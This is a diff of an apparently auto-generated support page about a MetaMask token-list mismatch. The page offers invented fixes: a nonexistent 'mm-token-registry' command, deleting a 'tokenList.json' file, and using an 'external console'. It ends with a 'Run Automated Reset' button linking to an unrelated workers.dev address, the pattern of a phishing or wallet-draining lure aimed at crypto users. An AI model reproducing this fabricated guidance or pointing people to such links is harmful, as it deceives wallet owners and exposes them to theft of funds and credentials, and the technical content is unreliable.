@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: sans-serif;
-        background: #0f111a;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #ff7b2c; }
     .btn {
-        background: #ff9455;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,29 +42,39 @@
 <h1>Metamask Extension Bug Assets Manage Tokens Miss Match With Net</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a mismatch between the tokens displayed in the "Manage Tokens" section of the Metamask extension and the network filter, resulting in incorrect token listings.</li>
+<li>The Metamask extension displays an inconsistent list of tokens when managing assets, which does not match the expected tokens for the currently selected network filter.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a desynchronization between the Metamask extension's internal token registry and the Ethereum network's token listings, often caused by outdated extension versions, incorrect network configurations, or incomplete token data.</li>
+<li>The error occurs due to a discrepancy between the locally stored token list and the tokens available on the Ethereum network, potentially caused by outdated token data or incorrect network configuration.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Update the Metamask extension to the latest version and restart the browser.</li>
-<li>Reset the Metamask token registry by executing the following command:</li>
+<li>To resolve the issue, try the following steps:</li>
+<li>Update the Metamask extension to the latest version</li>
+<li>Reset the token list by deleting the <code>tokenList.json</code> file</li>
+<li>Manually add the missing tokens using the following JSON configuration:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>mm-token-registry<span class="w"> </span>reset<span class="w"> </span>--network<span class="w"> </span>mainnet
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;tokens&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...token_address&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TOKEN_SYMBOL&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;decimals&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">18</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;image&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://...token_image_url&quot;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">]</span>
+<span class="p">}</span>
 </code></pre></div>
 
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration options.</p>
+<h2>Prerequisites</h2>
 <ul>
-<li>Manually add the missing tokens using the token contract address and decimal value.</li>
+<li>Metamask extension installed and configured</li>
+<li>Ethereum network connection established</li>
+<li>Basic understanding of JSON configuration files</li>
 </ul>
-<p>Prerequisites:
-* Metamask extension installed and configured for the Ethereum network
-* Basic understanding of Ethereum token contracts and decimal values
-* Latest version of the browser and Metamask extension</p>
-<p>For advanced troubleshooting, consider utilizing an external console to execute low-level commands and query the Ethereum network directly.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-ledger-if-blind-signing-is-disabled-reco.html">Metamask Extension Bug Ledger If Blind Signing Is Disabled Reco</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-account-discovery-and-syncs-error-for-so.html">Metamask Extension Bug Account Discovery And Syncs Error For Social Login Import Users</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-ledger-if-blind-signing-is-disabled-reco.html">Metamask Extension Bug Ledger If Blind Signing Is Disabled Reconnect</a></li><li><a href="./archive/2026/06/metamask-extension-bug-notifications-notification-badge-red-num.html">Metamask Extension Bug Notifications Notification Badge Red Num</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
